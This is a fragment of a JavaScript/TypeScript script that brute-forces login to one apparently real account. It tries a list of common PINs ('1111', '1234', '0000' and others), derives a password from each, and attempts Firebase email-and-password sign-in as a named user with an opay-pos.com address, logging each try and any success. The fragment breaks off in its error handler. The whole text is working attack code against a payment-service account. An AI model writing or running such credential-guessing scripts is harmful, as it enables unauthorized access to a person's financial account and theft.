...
const pins = ['1111', '1234', '0000', '2030', '1010', '2020'];

async function run() {
  const email = '8109064007@opay-pos.com'; // MIKA'ILU
  for (const pin of pins) {
    const password = getAuthPassword(pin);
    console.log(`Trying PIN: ${pin}, Password: ${password}...`);
    try {
      await signInWithEmailAndPassword(auth, email, password);
      console.log(`SUCCESS! Authenticated successfully as MIKA'ILU with PIN: ${pin}`);
      process.exit(0);
    } catch (err: any) {
